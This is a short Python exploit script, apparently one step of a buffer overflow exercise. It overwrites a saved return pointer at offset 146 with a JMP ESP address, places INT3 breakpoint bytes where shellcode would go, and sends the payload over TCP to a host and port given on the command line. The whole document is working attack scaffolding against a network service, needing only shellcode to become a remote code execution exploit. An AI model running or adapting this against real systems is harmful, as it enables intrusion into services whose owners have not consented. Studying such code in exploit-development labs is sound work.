#!/usr/bin/env python3
# stage 6 verify RET 
import socket,sys,struct


RHOST = sys.argv[1]
RPORT = int(sys.argv[2])


# handle payload 
offset = 146
total_buff_size = 1000 
pointer_to_jmp_esp = 0x080414C3 


postfix = b"\n"              
buff    = b""
lead_padding = b"\x41" * (offset - len(buff))                 # begin buffer padding
eip     = struct.pack("<I", pointer_to_jmp_esp)               # saved return pointer overwrite (EIP/SRP) 
esp     = b"\xCC\xCC\xCC\xCC"                                 # where esp should be pointing
trail_padding = b"\x44" * (total_buff_size - len(buff))


# handle payload
buff += lead_padding 
buff += eip 
buff += esp 
buff += trail_padding 
buff += postfix


# handle connection
print("[+] - Sendng Payload - [ {} Bytes ]".format(len(buff)))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
s.send(buff)
s.close()
